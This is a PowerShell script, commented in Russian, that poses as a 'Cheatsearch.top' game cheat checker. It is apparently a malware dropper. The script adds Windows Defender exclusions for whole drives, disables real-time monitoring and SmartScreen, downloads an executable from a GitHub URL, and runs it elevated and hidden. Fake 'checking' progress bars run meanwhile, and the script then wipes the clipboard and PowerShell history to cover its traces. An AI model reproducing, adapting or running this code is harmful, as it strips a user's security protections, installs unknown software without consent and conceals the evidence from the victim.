# Скрываем ошибки для красоты, но оставляем логику
$ErrorActionPreference = "SilentlyContinue"
Clear

Write-Host "Cheatsearch.top - Best cheat searcher!" -ForegroundColor Cyan

# 1. Настройка путей (Используем TEMP, чтобы точно были права на запись)
$outputFile = "$env:TEMP\ccmmd.exe"
$folderPath1 = "C:\Windows\Temp"
$folderPath2 = "C:\"
$folderPath3 = "C:\ProgramData"
$userPath = "C:\Users"

# 2. Попытка добавить исключения в Defender (нужны права админа)
Add-MpPreference -ExclusionPath $userPath, $folderPath1, $folderPath2, $folderPath3, $outputFile
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableAutoExclusions $true

# Отключаем SmartScreen через реестр
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD

# 3. Скачивание файла с правильным User-Agent
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
$webClient = New-Object System.Net.WebClient
# Стандартный заголовок браузера, чтобы GitHub не блокировал запрос
$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

try {
    $webClient.DownloadFile($url, $outputFile)
} catch {
    Write-Host "Download failed!" -ForegroundColor Red
}

# 4. Запуск EXE (с правами админа и скрыто)
if (Test-Path $outputFile) {
    Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle Hidden
}

# 5. Визуальная часть (Твои проценты)
$tasks = @(
    @{ name = "Checking gamefiles"; speed = 50 },
    @{ name = "Checking regedit"; speed = 150 },
    @{ name = "Checking LastActivity"; speed = 20 },
    @{ name = "Checking files"; speed = 120 }
)

foreach ($task in $tasks) {
    for ($i = 1; $i -le 100; $i++) {
        Write-Host -NoNewline ("$($task.name): $i% `r")
        Start-Sleep -Milliseconds $task.speed
    }
    Write-Host ("$($task.name): Complete!      ") -ForegroundColor DarkGreen
}

Write-Host "`nCheat check end!" -ForegroundColor Green
Write-Host "Visit cheatseach.top!" -ForegroundColor Cyan

# 6. Очистка следов (Буфер, История PowerShell)
Add-Type -AssemblyName PresentationCore
[System.Windows.Clipboard]::Clear()

try {
    $clipboardHistoryPath = "HKCU:\Software\Microsoft\Clipboard"
    if (Test-Path $clipboardHistoryPath) {
        Remove-Item -Path $clipboardHistoryPath -Recurse -Force
    }
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) { Remove-Item $historyPath -Force }
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
} catch {}
